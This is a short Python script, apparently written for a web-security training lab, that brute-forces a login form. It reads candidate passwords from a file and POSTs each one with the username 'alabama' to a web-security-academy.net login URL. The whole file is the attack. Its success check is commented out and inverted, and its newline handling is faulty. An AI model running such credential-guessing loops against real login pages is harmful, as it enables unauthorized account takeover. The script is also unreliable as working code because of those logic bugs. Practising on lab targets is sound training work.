import requests
import json

read = open('usernames.txt')
line = read.readline()

emptyList = []
while line:
    line = ''.join(line.split())
    if line in '/n':
        line = line[:-2]
    emptyList.append(line)
    line = read.readline()

for a in emptyList:
    payload = {'username': 'alabama', 'password': a}
    r = requests.post(
        "https://0a8b004203c083a5c0b2278800c2008b.web-security-academy.net/login", data=payload)
    # if 'Incorrect password' in r.text:
    #     print("Found!")
    #     print(a)
